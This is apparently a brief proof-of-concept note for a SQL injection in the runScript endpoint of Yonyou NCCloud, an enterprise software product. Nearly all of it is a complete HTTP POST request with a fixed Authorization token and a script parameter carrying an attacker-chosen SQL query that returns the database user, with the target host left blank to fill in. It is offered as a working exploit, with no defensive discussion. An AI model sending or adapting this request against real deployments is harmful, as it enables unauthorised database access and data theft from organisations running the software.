# NCC_runscript_sqli

form: https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BNCCloud%E7%B3%BB%E7%BB%9FrunScript%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
2024.3.25 @2 
```
POST /ncchr/attendScript/internal/runScript HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
Content-Length: 59
Accept: */*
Accept-Encoding: gzip
Accept-Language: en
Authorization: 58e00466213416018d01d15de83b0198
Connection: close
Content-Type: application/x-www-form-urlencoded

key=1&script=select 1,111*111,USER,4,5,6,7,8,9,10 from dual
```
